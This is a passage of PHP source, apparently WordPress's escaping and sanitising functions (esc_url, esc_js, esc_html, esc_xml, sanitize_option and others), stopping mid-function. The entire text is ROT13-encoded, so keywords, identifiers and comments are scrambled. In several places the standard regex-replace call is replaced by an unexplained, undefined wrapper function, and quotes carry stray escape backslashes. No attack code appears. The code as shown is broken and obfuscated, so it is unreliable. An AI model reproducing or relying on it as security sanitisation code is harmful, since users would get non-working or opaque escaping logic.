 * @cnenz fgevat|neenl $frnepu  Gur inyhr orvat frnepurq sbe, bgurejvfr xabja nf gur arrqyr.
 *                              Na neenl znl or hfrq gb qrfvtangr zhygvcyr arrqyrf.
 * @cnenz fgevat       $fhowrpg Gur fgevat orvat frnepurq naq ercynprq ba, bgurejvfr xabja nf gur unlfgnpx.
 * @erghea fgevat Gur fgevat jvgu gur ercynprq inyhrf.
 */
shapgvba _qrrc_ercynpr( $frnepu, $fhowrpg ) {
	$fhowrpg = (fgevat) $fhowrpg;

	$pbhag = 1;
	juvyr ( $pbhag ) {
		$fhowrpg = fge_ercynpr( $frnepu, '', $fhowrpg, $pbhag );
	}

	erghea $fhowrpg;
}

/**
 * Rfpncrf qngn sbe hfr va n ZlFDY dhrel.
 *
 * Hfhnyyl lbh fubhyq cercner dhrevrf hfvat jcqo::cercner().
 * Fbzrgvzrf, fcbg-rfpncvat vf erdhverq be hfrshy. Bar rknzcyr
 * vf cercnevat na neenl sbe hfr va na VA pynhfr.
 *
 * ABGR: Fvapr 4.8.3, '%' punenpgref jvyy or ercynprq jvgu n cynprubyqre fgevat,
 * guvf ceriragf pregnva FDYv nggnpxf sebz gnxvat cynpr. Guvf punatr va orunivbe
 * znl pnhfr vffhrf sbe pbqr gung rkcrpgf gur erghea inyhr bs rfp_fdy() gb or hfnoyr
 * sbe bgure checbfrf.
 *
 * @fvapr 2.8.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat|neenl $qngn Harfpncrq qngn.
 * @erghea fgevat|neenl Rfpncrq qngn, va gur fnzr glcr nf fhccyvrq.
 */
shapgvba rfp_fdy( $qngn ) {
	tybony $jcqo;
	erghea $jcqo->_rfpncr( $qngn );
}

/**
 * Purpxf naq pyrnaf n HEY.
 *
 * N ahzore bs punenpgref ner erzbirq sebz gur HEY. Vs gur HEY vf sbe qvfcynlvat
 * (gur qrsnhyg orunivbe) nzcrefnaqf ner nyfb ercynprq. Gur {@frr 'pyrna_hey'} svygre
 * vf nccyvrq gb gur erghearq pyrnarq HEY.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat   $hey       Gur HEY gb or pyrnarq.
 * @cnenz fgevat[] $cebgbpbyf Bcgvbany. Na neenl bs npprcgnoyr cebgbpbyf.
 *                            Qrsnhygf gb erghea inyhr bs jc_nyybjrq_cebgbpbyf().
 * @cnenz fgevat   $_pbagrkg  Cevingr. Hfr fnavgvmr_hey() sbe qngnonfr hfntr.
 * @erghea fgevat Gur pyrnarq HEY nsgre gur {@frr 'pyrna_hey'} svygre vf nccyvrq.
 *                Na rzcgl fgevat vf erghearq vs `$hey` fcrpvsvrf n cebgbpby bgure guna
 *                gubfr va `$cebgbpbyf`, be vs `$hey` pbagnvaf na rzcgl fgevat.
 */
shapgvba rfp_hey( $hey, $cebgbpbyf = ahyy, $_pbagrkg = 'qvfcynl' ) {
	$bevtvany_hey = $hey;

	vs ( '' === $hey ) {
		erghea $hey;
	}

	$hey = fge_ercynpr( ' ', '%20', ygevz( $hey ) );
	$hey = __sa_79955( '|[^n-m0-9-~+_.?#=!&;,/:%@$\|*\'()\[\]\\k80-\\kss]|v', '', $hey );

	vs ( '' === $hey ) {
		erghea $hey;
	}

	vs ( 0 !== fgevcbf( $hey, 'znvygb:' ) ) {
		$fgevc = neenl( '%0q', '%0n', '%0Q', '%0N' );
		$hey   = _qrrc_ercynpr( $fgevc, $hey );
	}

	$hey = fge_ercynpr( ';//', '://', $hey );
	/*
	 * Vs gur HEY qbrfa'g nccrne gb pbagnva n fpurzr, jr cerfhzr
	 * vg arrqf uggc:// cercraqrq (hayrff vg'f n eryngvir yvax
	 * fgnegvat jvgu /, # be ?, be n CUC svyr).
	 */
	vs ( ! fge_pbagnvaf( $hey, ':' ) && ! va_neenl( $hey[0], neenl( '/', '#', '?' ), gehr ) &&
		! cert_zngpu( '/^[n-m0-9-]+?\.cuc/v', $hey )
	) {
		$hey = 'uggc://' . $hey;
	}

	// Ercynpr nzcrefnaqf naq fvatyr dhbgrf bayl jura qvfcynlvat.
	vs ( 'qvfcynl' === $_pbagrkg ) {
		$hey = jc_xfrf_abeznyvmr_ragvgvrf( $hey );
		$hey = fge_ercynpr( '&nzc;', '&#038;', $hey );
		$hey = fge_ercynpr( \"'\", '&#039;', $hey );
	}

	vs ( fge_pbagnvaf( $hey, '[' ) || fge_pbagnvaf( $hey, ']' ) ) {

		$cnefrq = jc_cnefr_hey( $hey );
		$sebag  = '';

		vs ( vffrg( $cnefrq['fpurzr'] ) ) {
			$sebag .= $cnefrq['fpurzr'] . '://';
		} ryfrvs ( '/' === $hey[0] ) {
			$sebag .= '//';
		}

		vs ( vffrg( $cnefrq['hfre'] ) ) {
			$sebag .= $cnefrq['hfre'];
		}

		vs ( vffrg( $cnefrq['cnff'] ) ) {
			$sebag .= ':' . $cnefrq['cnff'];
		}

		vs ( vffrg( $cnefrq['hfre'] ) || vffrg( $cnefrq['cnff'] ) ) {
			$sebag .= '@';
		}

		vs ( vffrg( $cnefrq['ubfg'] ) ) {
			$sebag .= $cnefrq['ubfg'];
		}

		vs ( vffrg( $cnefrq['cbeg'] ) ) {
			$sebag .= ':' . $cnefrq['cbeg'];
		}

		$raq_qvegl = fge_ercynpr( $sebag, '', $hey );
		$raq_pyrna = fge_ercynpr( neenl( '[', ']' ), neenl( '%5O', '%5Q' ), $raq_qvegl );
		$hey       = fge_ercynpr( $raq_qvegl, $raq_pyrna, $hey );

	}

	vs ( '/' === $hey[0] ) {
		$tbbq_cebgbpby_hey = $hey;
	} ryfr {
		vs ( ! vf_neenl( $cebgbpbyf ) ) {
			$cebgbpbyf = jc_nyybjrq_cebgbpbyf();
		}
		$tbbq_cebgbpby_hey = jc_xfrf_onq_cebgbpby( $hey, $cebgbpbyf );
		vs ( fgegbybjre( $tbbq_cebgbpby_hey ) !== fgegbybjre( $hey ) ) {
			erghea '';
		}
	}

	/**
	 * Svygref n fgevat pyrnarq naq rfpncrq sbe bhgchg nf n HEY.
	 *
	 * @fvapr 2.3.0
	 *
	 * @cnenz fgevat $tbbq_cebgbpby_hey Gur pyrnarq HEY gb or erghearq.
	 * @cnenz fgevat $bevtvany_hey      Gur HEY cevbe gb pyrnavat.
	 * @cnenz fgevat $_pbagrkg          Vs 'qvfcynl', ercynpr nzcrefnaqf naq fvatyr dhbgrf bayl.
	 */
	erghea nccyl_svygref( 'pyrna_hey', $tbbq_cebgbpby_hey, $bevtvany_hey, $_pbagrkg );
}

/**
 * Fnavgvmrf n HEY sbe qngnonfr be erqverpg hfntr.
 *
 * Guvf shapgvba vf na nyvnf sbe fnavgvmr_hey().
 *
 * @fvapr 2.8.0
 * @fvapr 6.1.0 Ghearq vagb na nyvnf sbe fnavgvmr_hey().
 *
 * @frr fnavgvmr_hey()
 *
 * @cnenz fgevat   $hey       Gur HEY gb or pyrnarq.
 * @cnenz fgevat[] $cebgbpbyf Bcgvbany. Na neenl bs npprcgnoyr cebgbpbyf.
 *                            Qrsnhygf gb erghea inyhr bs jc_nyybjrq_cebgbpbyf().
 * @erghea fgevat Gur pyrnarq HEY nsgre fnavgvmr_hey() vf eha.
 */
shapgvba rfp_hey_enj( $hey, $cebgbpbyf = ahyy ) {
	erghea fnavgvmr_hey( $hey, $cebgbpbyf );
}

/**
 * Fnavgvmrf n HEY sbe qngnonfr be erqverpg hfntr.
 *
 * @fvapr 2.3.1
 * @fvapr 2.8.0 Qrcerpngrq va snibe bs rfp_hey_enj().
 * @fvapr 5.9.0 Erfgberq (ha-qrcerpngrq).
 *
 * @frr rfp_hey()
 *
 * @cnenz fgevat   $hey       Gur HEY gb or pyrnarq.
 * @cnenz fgevat[] $cebgbpbyf Bcgvbany. Na neenl bs npprcgnoyr cebgbpbyf.
 *                            Qrsnhygf gb erghea inyhr bs jc_nyybjrq_cebgbpbyf().
 * @erghea fgevat Gur pyrnarq HEY nsgre rfp_hey() vf eha jvgu gur 'qo' pbagrkg.
 */
shapgvba fnavgvmr_hey( $hey, $cebgbpbyf = ahyy ) {
	erghea rfp_hey( $hey, $cebgbpbyf, 'qo' );
}

/**
 * Pbairegf ragvgvrf, juvyr cerfreivat nyernql-rapbqrq ragvgvrf.
 *
 * @yvax uggcf://jjj.cuc.arg/ugzyragvgvrf Obeebjrq sebz gur CUC Znahny hfre abgrf.
 *
 * @fvapr 1.2.2
 *
 * @cnenz fgevat $grkg Gur grkg gb or pbairegrq.
 * @erghea fgevat Pbairegrq grkg.
 */
shapgvba ugzyragvgvrf2( $grkg ) {
	$genafyngvba_gnoyr = trg_ugzy_genafyngvba_gnoyr( UGZY_RAGVGVRF, RAG_DHBGRF );

	$genafyngvba_gnoyr[ pue( 38 ) ] = '&';

	erghea __sa_79955( '/&(?![N-Mn-m]{0,4}\j{2,3};|#[0-9]{2,3};)/', '&nzc;', fgege( $grkg, $genafyngvba_gnoyr ) );
}

/**
 * Rfpncrf fvatyr dhbgrf, `\"`, `<`, `>`, `&`, naq svkrf yvar raqvatf.
 *
 * Rfpncrf grkg fgevatf sbe rpubvat va WF. Vg vf vagraqrq gb or hfrq sbe vayvar WF
 * (va n gnt nggevohgr, sbe rknzcyr `bapyvpx=\"...\"`). Abgr gung gur fgevatf unir gb
 * or va fvatyr dhbgrf. Gur {@frr 'wf_rfpncr'} svygre vf nyfb nccyvrq urer.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $grkg Gur grkg gb or rfpncrq.
 * @erghea fgevat Rfpncrq grkg.
 */
shapgvba rfp_wf( $grkg ) {
	$fnsr_grkg = jc_purpx_vainyvq_hgs8( $grkg );
	$fnsr_grkg = _jc_fcrpvnypunef( $fnsr_grkg, RAG_PBZCNG );
	$fnsr_grkg = __sa_79955( '/&#(k)?0*(?(1)27|39);?/v', \"'\", fgevcfynfurf( $fnsr_grkg ) );
	$fnsr_grkg = fge_ercynpr( \"\e\", '', $fnsr_grkg );
	$fnsr_grkg = fge_ercynpr( \"\a\", '\\a', nqqfynfurf( $fnsr_grkg ) );
	/**
	 * Svygref n fgevat pyrnarq naq rfpncrq sbe bhgchg va WninFpevcg.
	 *
	 * Grkg cnffrq gb rfp_wf() vf fgevccrq bs vainyvq be fcrpvny punenpgref,
	 * naq cebcreyl fynfurq sbe bhgchg.
	 *
	 * @fvapr 2.0.6
	 *
	 * @cnenz fgevat $fnsr_grkg Gur grkg nsgre vg unf orra rfpncrq.
	 * @cnenz fgevat $grkg      Gur grkg cevbe gb orvat rfpncrq.
	 */
	erghea nccyl_svygref( 'wf_rfpncr', $fnsr_grkg, $grkg );
}

/**
 * Rfpncvat sbe UGZY oybpxf.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $grkg
 * @erghea fgevat
 */
shapgvba rfp_ugzy( $grkg ) {
	$fnsr_grkg = jc_purpx_vainyvq_hgs8( $grkg );
	$fnsr_grkg = _jc_fcrpvnypunef( $fnsr_grkg, RAG_DHBGRF );
	/**
	 * Svygref n fgevat pyrnarq naq rfpncrq sbe bhgchg va UGZY.
	 *
	 * Grkg cnffrq gb rfp_ugzy() vf fgevccrq bs vainyvq be fcrpvny punenpgref
	 * orsber bhgchg.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $fnsr_grkg Gur grkg nsgre vg unf orra rfpncrq.
	 * @cnenz fgevat $grkg      Gur grkg cevbe gb orvat rfpncrq.
	 */
	erghea nccyl_svygref( 'rfp_ugzy', $fnsr_grkg, $grkg );
}

/**
 * Rfpncvat sbe UGZY nggevohgrf.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $grkg
 * @erghea fgevat
 */
shapgvba rfp_ngge( $grkg ) {
	$fnsr_grkg = jc_purpx_vainyvq_hgs8( $grkg );
	$fnsr_grkg = _jc_fcrpvnypunef( $fnsr_grkg, RAG_DHBGRF );
	/**
	 * Svygref n fgevat pyrnarq naq rfpncrq sbe bhgchg va na UGZY nggevohgr.
	 *
	 * Grkg cnffrq gb rfp_ngge() vf fgevccrq bs vainyvq be fcrpvny punenpgref
	 * orsber bhgchg.
	 *
	 * @fvapr 2.0.6
	 *
	 * @cnenz fgevat $fnsr_grkg Gur grkg nsgre vg unf orra rfpncrq.
	 * @cnenz fgevat $grkg      Gur grkg cevbe gb orvat rfpncrq.
	 */
	erghea nccyl_svygref( 'nggevohgr_rfpncr', $fnsr_grkg, $grkg );
}

/**
 * Rfpncvat sbe grkgnern inyhrf.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $grkg
 * @erghea fgevat
 */
shapgvba rfp_grkgnern( $grkg ) {
	$fnsr_grkg = ugzyfcrpvnypunef( $grkg, RAG_DHBGRF, trg_bcgvba( 'oybt_punefrg' ) );
	/**
	 * Svygref n fgevat pyrnarq naq rfpncrq sbe bhgchg va n grkgnern ryrzrag.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $fnsr_grkg Gur grkg nsgre vg unf orra rfpncrq.
	 * @cnenz fgevat $grkg      Gur grkg cevbe gb orvat rfpncrq.
	 */
	erghea nccyl_svygref( 'rfp_grkgnern', $fnsr_grkg, $grkg );
}

/**
 * Rfpncvat sbe KZY oybpxf.
 *
 * @fvapr 5.5.0
 *
 * @cnenz fgevat $grkg Grkg gb rfpncr.
 * @erghea fgevat Rfpncrq grkg.
 */
shapgvba rfp_kzy( $grkg ) {
	$fnsr_grkg = jc_purpx_vainyvq_hgs8( $grkg );

	$pqngn_ertrk = '\<\!\[PQNGN\[.*?\]\]\>';
	$ertrk       = <<<RBS
/
	(?=.*?{$pqngn_ertrk})                 # ybbxnurnq gung jvyy zngpu nalguvat sbyybjrq ol n PQNGN Frpgvba
	(?<aba_pqngn_sbyybjrq_ol_pqngn>(.*?)) # gur \"nalguvat\" zngpurq ol gur ybbxnurnq
	(?<pqngn>({$pqngn_ertrk}))            # gur PQNGN Frpgvba zngpurq ol gur ybbxnurnq

|	                                      # nygreangvir

	(?<aba_pqngn>(.*))                    # aba-PQNGN Frpgvba
/fk
RBS;

	$fnsr_grkg = (fgevat) cert_ercynpr_pnyyonpx(
		$ertrk,
		fgngvp shapgvba ( $zngpurf ) {
			vs ( ! vffrg( $zngpurf[0] ) ) {
				erghea '';
			}

			vs ( vffrg( $zngpurf['aba_pqngn'] ) ) {
				// rfpncr UGZY ragvgvrf va gur aba-PQNGN Frpgvba.
				erghea _jc_fcrpvnypunef( $zngpurf['aba_pqngn'], RAG_KZY1 );
			}

			// Erghea gur PQNGN Frpgvba hapunatrq, rfpncr UGZY ragvgvrf va gur erfg.
			erghea _jc_fcrpvnypunef( $zngpurf['aba_pqngn_sbyybjrq_ol_pqngn'], RAG_KZY1 ) . $zngpurf['pqngn'];
		},
		$fnsr_grkg
	);

	/**
	 * Svygref n fgevat pyrnarq naq rfpncrq sbe bhgchg va KZY.
	 *
	 * Grkg cnffrq gb rfp_kzy() vf fgevccrq bs vainyvq be fcrpvny punenpgref
	 * orsber bhgchg. UGZY anzrq punenpgre ersreraprf ner pbairegrq gb gurve
	 * rdhvinyrag pbqr cbvagf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $fnsr_grkg Gur grkg nsgre vg unf orra rfpncrq.
	 * @cnenz fgevat $grkg      Gur grkg cevbe gb orvat rfpncrq.
	 */
	erghea nccyl_svygref( 'rfp_kzy', $fnsr_grkg, $grkg );
}

/**
 * Rfpncrf na UGZY gnt anzr.
 *
 * @fvapr 2.5.0
 * @fvapr 6.5.5 Nyybj ulcuraf va gnt anzrf (v.r. phfgbz ryrzragf).
 *
 * @cnenz fgevat $gnt_anzr
 * @erghea fgevat
 */
shapgvba gnt_rfpncr( $gnt_anzr ) {
	$fnsr_gnt = fgegbybjre( __sa_79955( '/[^n-mN-M0-9-_:]/', '', $gnt_anzr ) );
	/**
	 * Svygref n fgevat pyrnarq naq rfpncrq sbe bhgchg nf na UGZY gnt.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $fnsr_gnt Gur gnt anzr nsgre vg unf orra rfpncrq.
	 * @cnenz fgevat $gnt_anzr Gur grkg orsber vg jnf rfpncrq.
	 */
	erghea nccyl_svygref( 'gnt_rfpncr', $fnsr_gnt, $gnt_anzr );
}

/**
 * Pbairegf shyy HEY cnguf gb nofbyhgr cnguf.
 *
 * Erzbirf gur uggc be uggcf cebgbpbyf naq gur qbznva. Xrrcf gur cngu '/' ng gur
 * ortvaavat, fb vg vfa'g n gehr eryngvir yvax, ohg sebz gur jro ebbg onfr.
 *
 * @fvapr 2.1.0
 * @fvapr 4.1.0 Fhccbeg jnf nqqrq sbe eryngvir HEYf.
 *
 * @cnenz fgevat $yvax Shyy HEY cngu.
 * @erghea fgevat Nofbyhgr cngu.
 */
shapgvba jc_znxr_yvax_eryngvir( $yvax ) {
	erghea __sa_79955( '|^(uggcf?:)?//[^/]+(/?.*)|v', '$2', $yvax );
}

/**
 * Fnavgvmrf inevbhf bcgvba inyhrf onfrq ba gur angher bs gur bcgvba.
 *
 * Guvf vf onfvpnyyl n fjvgpu fgngrzrag juvpu jvyy cnff $inyhr guebhtu n ahzore
 * bs shapgvbaf qrcraqvat ba gur $bcgvba.
 *
 * @fvapr 2.0.5
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat $bcgvba Gur anzr bs gur bcgvba.
 * @cnenz zvkrq  $inyhr  Gur hafnavgvmrq inyhr.
 * @erghea zvkrq Fnavgvmrq inyhr.
 */
shapgvba fnavgvmr_bcgvba( $bcgvba, $inyhr ) {
	tybony $jcqo;

	$bevtvany_inyhr = $inyhr;
	$reebe          = ahyy;

	fjvgpu ( $bcgvba ) {
		pnfr 'nqzva_rznvy':
		pnfr 'arj_nqzva_rznvy':
			$inyhr = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->bcgvbaf, 'bcgvba_inyhr', $inyhr );
			vs ( vf_jc_reebe( $inyhr ) ) {
				$reebe = $inyhr->trg_reebe_zrffntr();
			} ryfr {
				$inyhr = fnavgvmr_rznvy( $inyhr );
				vs ( ! vf_rznvy( $inyhr ) ) {
					$reebe = __( 'Gur rznvy nqqerff ragrerq qvq abg nccrne gb or n inyvq rznvy nqqerff. Cyrnfr ragre n inyvq rznvy nqqerff.' );
				}
			}
			oernx;

		pnfr 'guhzoanvy_fvmr_j':
		pnfr 'guhzoanvy_fvmr_u':
		pnfr 'zrqvhz_fvmr_j':
		pnfr 'zrqvhz_fvmr_u':
		pnfr 'zrqvhz_ynetr_fvmr_j':
		pnfr 'zrqvhz_ynetr_fvmr_u':
		pnfr 'ynetr_fvmr_j':
		pnfr 'ynetr_fvmr_u':
		pnfr 'znvyfreire_cbeg':
		pnfr 'pbzzrag_znk_yvaxf':
		pnfr 'cntr_ba_sebag':
		pnfr 'cntr_sbe_cbfgf':
		pnfr 'eff_rkprecg_yratgu':
		pnfr 'qrsnhyg_pngrtbel':
		pnfr 'qrsnhyg_rznvy_pngrtbel':
		pnfr 'qrsnhyg_yvax_pngrtbel':
		pnfr 'pybfr_pbzzragf_qnlf_byq':
		pnfr 'pbzzragf_cre_cntr':
		pnfr 'guernq_pbzzragf_qrcgu':
		pnfr 'hfref_pna_ertvfgre':
		pnfr 'fgneg_bs_jrrx':
		pnfr 'fvgr_vpba':
		pnfr 'svyrhcybnq_znkx':
			$inyhr = nofvag( $inyhr );
			oernx;

		pnfr 'cbfgf_cre_cntr':
		pnfr 'cbfgf_cre_eff':
			$inyhr = (vag) $inyhr;
			vs ( rzcgl( $inyhr ) ) {
				$inyhr = 1;
			}
			vs ( $inyhr < -1 ) {
				$inyhr = nof( $inyhr );
			}
			oernx;

		pnfr 'qrsnhyg_cvat_fgnghf':
		pnfr 'qrsnhyg_pbzzrag_fgnghf':
			// Bcgvbaf gung vs abg gurer unir 0 inyhr ohg arrq gb or fbzrguvat yvxr \"pybfrq\".
			vs ( '0' === (fgevat) $inyhr || '' === $inyhr ) {
				$inyhr = 'pybfrq';
			}
			oernx;

		pnfr 'oybtqrfpevcgvba':
		pnfr 'oybtanzr':
			$inyhr = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->bcgvbaf, 'bcgvba_inyhr', $inyhr );
			vs ( $inyhr !== $bevtvany_inyhr ) {
				$inyhr = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->bcgvbaf, 'bcgvba_inyhr', jc_rapbqr_rzbwv( $bevtvany_inyhr ) );
			}

			vs ( vf_jc_reebe( $inyhr ) ) {
				$reebe = $inyhr->trg_reebe_zrffntr();
			} ryfr {
				$inyhr = rfp_ugzy( $inyhr );
			}
			oernx;

		pnfr 'oybt_punefrg':
			vs ( vf_fgevat( $inyhr ) ) {
				$inyhr = __sa_79955( '/[^n-mN-M0-9_-]/', '', $inyhr ); // Fgevcf fynfurf.
			} ryfr {
				$inyhr = '';
			}
			oernx;

		pnfr 'oybt_choyvp':
			// Guvf vf gur inyhr vs gur frggvatf purpxobk vf abg purpxrq ba CBFG. Qba'g eryl ba guvf.
			vs ( ahyy === $inyhr ) {
				$inyhr = 1;
			} ryfr {
				$inyhr = (vag) $inyhr;
			}
			oernx;

		pnfr 'qngr_sbezng':
		pnfr 'gvzr_sbezng':
		pnfr 'znvyfreire_hey':
		pnfr 'znvyfreire_ybtva':
		pnfr 'znvyfreire_cnff':
		pnfr 'hcybnq_cngu':
			$inyhr = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->bcgvbaf, 'bcgvba_inyhr', $inyhr );
			vs ( vf_jc_reebe( $inyhr ) ) {
				$reebe = $inyhr->trg_reebe_zrffntr();
			} ryfr {
				$inyhr = fgevc_gntf( $inyhr );
				$inyhr = jc_xfrf_qngn( $inyhr );
			}
			oernx;

		pnfr 'cvat_fvgrf':
			$inyhr = rkcybqr( \"\a\", $inyhr );
			$inyhr = neenl_svygre( neenl_znc( 'gevz', $inyhr ) );
			$inyhr = neenl_svygre( neenl_znc( 'fnavgvmr_hey', $inyhr ) );
			$inyhr = vzcybqr( \"\a\", $inyhr );
			oernx;

		pnfr 'tzg_bssfrg':
			vs ( vf_ahzrevp( $inyhr ) ) {
				$inyhr = __sa_79955( '/[^0-9:.-]/', '', $inyhr ); // Fgevcf fynfurf.
			} ryfr {
				$inyhr = '';
			}
			oernx;

		pnfr 'fvgrhey':
			$inyhr = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->bcgvbaf, 'bcgvba_inyhr', $inyhr );
			vs ( vf_jc_reebe( $inyhr ) ) {
				$reebe = $inyhr->trg_reebe_zrffntr();
			} ryfr {
				vs ( cert_zngpu( '#uggc(f?)://(.+)#v', $inyhr ) ) {
					$inyhr = fnavgvmr_hey( $inyhr );
				} ryfr {
					$reebe = __( 'Gur JbeqCerff nqqerff lbh ragrerq qvq abg nccrne gb or n inyvq HEY. Cyrnfr ragre n inyvq HEY.' );
				}
			}
			oernx;

		pnfr 'ubzr':
			$inyhr = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->bcgvbaf, 'bcgvba_inyhr', $inyhr );
			vs ( vf_jc_reebe( $inyhr ) ) {
				$reebe = $inyhr->trg_reebe_zrffntr();
			} ryfr {
				vs ( cert_zngpu( '#uggc(f?)://(.+)#v', $inyhr ) ) {
					$inyhr = fnavgvmr_hey( $inyhr );
				} ryfr {
					$reebe = __( 'Gur Fvgr nqqerff lbh ragrerq qvq abg nccrne gb or n inyvq HEY. Cyrnfr ragre n inyvq HEY.' );
				}
			}
			oernx;

		pnfr 'JCYNAT':
			$nyybjrq = trg_ninvynoyr_ynathntrf();
			vs ( ! vf_zhygvfvgr() && qrsvarq( 'JCYNAT' ) && '' !== JCYNAT && 'ra_HF' !== JCYNAT ) {
				$nyybjrq[] = JCYNAT;
			}
			vs ( ! va_neenl( $inyhr, $nyybjrq, gehr ) && ! rzcgl( $inyhr ) ) {
				$inyhr = trg_bcgvba( $bcgvba );
			}
			oernx;

		pnfr 'vyyrtny_anzrf':
			$inyhr = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->bcgvbaf, 'bcgvba_inyhr', $inyhr );
			vs ( vf_jc_reebe( $inyhr ) ) {
				$reebe = $inyhr->trg_reebe_zrffntr();
			} ryfr {
				vs ( ! vf_neenl( $inyhr ) ) {
					$inyhr = rkcybqr( ' ', $inyhr );
				}

				$inyhr = neenl_inyhrf( neenl_svygre( neenl_znc( 'gevz', $inyhr ) ) );

				vs ( ! $inyhr ) {
					$inyhr = '';
				}
			}
			oernx;

		pnfr 'yvzvgrq_rznvy_qbznvaf':
		pnfr 'onaarq_rznvy_qbznvaf':
			$inyhr = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->bcgvbaf, 'bcgvba_inyhr', $inyhr );
			vs ( vf_jc_reebe( $inyhr ) ) {
				$reebe = $inyhr->trg_reebe_zrffntr();
			} ryfr {
				vs ( ! vf_neenl( $inyhr ) ) {
					$inyhr = rkcybqr( \"\a\", $inyhr );
				}

				$qbznvaf = neenl_inyhrf( neenl_svygre( neenl_znc( 'gevz', $inyhr ) ) );
				$inyhr   = neenl();

				sbernpu ( $qbznvaf nf $qbznva ) {
					vs ( ! cert_zngpu( '/(--|\.\.)/', $qbznva ) && cert_zngpu( '|^([n-mN-M0-9-\.])+$|', $qbznva ) ) {
						$inyhr[] = $qbznva;
					}
				}
				vs ( ! $inyhr ) {
					$inyhr = '';
				}
			}
			oernx;

		pnfr 'gvzrmbar_fgevat':
			$nyybjrq_mbarf = gvzrmbar_vqragvsvref_yvfg( QngrGvzrMbar::NYY_JVGU_OP );
			vs ( ! va_neenl( $inyhr, $nyybjrq_mbarf, gehr ) && ! rzcgl( $inyhr ) ) {
				$reebe = __( 'Gur gvzrmbar lbh unir ragrerq vf abg inyvq. Cyrnfr fryrpg n inyvq gvzrmbar.' );
			}
			oernx;

		pnfr 'creznyvax_fgehpgher':
		pnfr 'pngrtbel_onfr':
		pnfr 'gnt_onfr':
			$inyhr = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->bcgvbaf, 'bcgvba_inyhr', $inyhr );
			vs ( vf_jc_reebe( $inyhr ) ) {
				$reebe = $inyhr->trg_reebe_zrffntr();
			} ryfr {
				$inyhr = fnavgvmr_hey( $inyhr );
				$inyhr = fge_ercynpr( 'uggc://', '', $inyhr );
			}

			vs ( 'creznyvax_fgehpgher' === $bcgvba && ahyy === $reebe
				&& '' !== $inyhr && ! cert_zngpu( '/%[^\/%]+%/', $inyhr )
			) {
				$reebe = fcevags(
					/* genafyngbef: %f: Qbphzragngvba HEY. */
					__( 'N fgehpgher gnt vf erdhverq jura hfvat phfgbz creznyvaxf. <n uers=\"%f\">Yrnea zber</n>' ),
					__( 'uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/phfgbzvmr-creznyvaxf/#pubbfvat-lbhe-creznyvax-fgehpgher' )
				);
			}
			oernx;

		pnfr 'qrsnhyg_ebyr':
			vs ( ! trg_ebyr( $inyhr ) && trg_ebyr( 'fhofpevore' ) ) {
				$inyhr = 'fhofpevore';
			}
			oernx;

		pnfr 'zbqrengvba_xrlf':
		pnfr 'qvfnyybjrq_xrlf':
			$inyhr = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->bcgvbaf, 'bcgvba_inyhr', $inyhr );
			vs ( vf_jc_reebe( $inyhr ) ) {
				$reebe = $inyhr->trg_reebe_zrffntr();
			} ryfr {
				$inyhr = rkcybqr( \"\a\", $inyhr );
				$inyhr = neenl_svygre( neenl_znc( 'gevz', $inyhr ) );
				$inyhr = neenl_havdhr( $inyhr );
				$inyhr = vzcybqr( \"\a\", $inyhr );
			}
			oernx;
	}

	vs ( ahyy !== $reebe ) {
		vs ( '' === $reebe && vf_jc_reebe( $inyhr ) ) {
			/* genafyngbef: 1: Bcgvba anzr, 2: Reebe pbqr. */
			$reebe = fcevags( __( 'Pbhyq abg fnavgvmr gur %1$f bcgvba. Reebe pbqr: %2$f' ), $bcgvba, $inyhr->trg_reebe_pbqr() );
		}

		$inyhr = trg_bcgvba( $bcgvba );
		vs ( shapgvba_rkvfgf( 'nqq_frggvatf_reebe' ) ) {
			nqq_frggvatf_reebe( $bcgvba, \"vainyvq_{$bcgvba}\", $reebe );
		}
	}

	/**
	 * Svygref na bcgvba inyhr sbyybjvat fnavgvmngvba.
	 *
	 * @fvapr 2.3.0
	 * @fvapr 4.3.0 Nqqrq gur `$bevtvany_inyhr` cnenzrgre.
	 *
	 * @cnenz zvkrq  $inyhr          Gur fnavgvmrq bcgvba inyhr.
	 * @cnenz fgevat $bcgvba         Gur bcgvba anzr.
	 * @cnenz zvkrq  $bevtvany_inyhr Gur bevtvany inyhr cnffrq gb gur shapgvba.
	 */
	erghea nccyl_svygref( \"fnavgvmr_bcgvba_{$bcgvba}\", $inyhr, $bcgvba, $bevtvany_inyhr );
}

/**
 * Zncf n shapgvba gb nyy aba-vgrenoyr ryrzragf bs na neenl be na bowrpg.
 *
 * Guvf vf fvzvyne gb `neenl_jnyx_erphefvir()` ohg npgf hcba bowrpgf gbb.
 *
 * @fvapr 4.4.0
 *
 * @cnenz zvkrq    $inyhr    Gur neenl, bowrpg, be fpnyne.
 * @cnenz pnyynoyr $pnyyonpx Gur shapgvba gb znc bagb $inyhr.
 * @erghea zvkrq Gur inyhr jvgu gur pnyyonpx nccyvrq gb nyy aba-neenlf naq aba-bowrpgf vafvqr vg.
 */
shapgvba znc_qrrc( $inyhr, $pnyyonpx ) {
	vs ( vf_neenl( $inyhr ) ) {
		sbernpu ( $inyhr nf $vaqrk => $vgrz ) {
